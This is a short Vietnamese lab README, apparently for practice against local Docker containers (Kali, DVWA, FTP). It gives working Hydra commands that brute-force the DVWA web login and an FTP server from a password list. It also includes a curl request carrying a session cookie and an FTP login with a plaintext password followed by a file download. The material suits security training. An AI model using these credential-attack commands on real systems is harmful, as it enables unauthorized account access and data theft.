# setup
+ chạy docker: docker compose up -d
+ vào môi trường dòng lệnh kali linux `docker exec -it kali_container /bin/bash`

# brute-force với http Page
+ truy cập vào trang web `http://localhost:8080/` setup page
+ curl kiểm tra request: curl -H "Cookie: security=low; PHPSESSID=gaqp3n4hhqo3fqv8mf7ibt1es1" "http://172.23.0.4/vulnerabilities/brute/?username=admin&password=123&Login=Login"
+ lệnh `hydra -l admin -P home/kali_data/passwords.txt 'http-get-form://dvwa_container/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:security=low; PHPSESSID=<cookie_id>:Username and/or password incorrect.'`

+ hướng dẫn: https://medium.com/@hamidullahbayram/using-hydra-on-login-pages-with-a-right-method-dvwa-training-1e85e8d4f5fd

# brute-force với ftp:
+ lệnh `hydra -l user -P home/kali_data/passwords.txt ftp_container ftp`.
+ Đăng nhập Ftp server: `lftp ftp://user:strongpassword123@ftp_container`
+ Lấy file từ server ftp: `mget index.html`
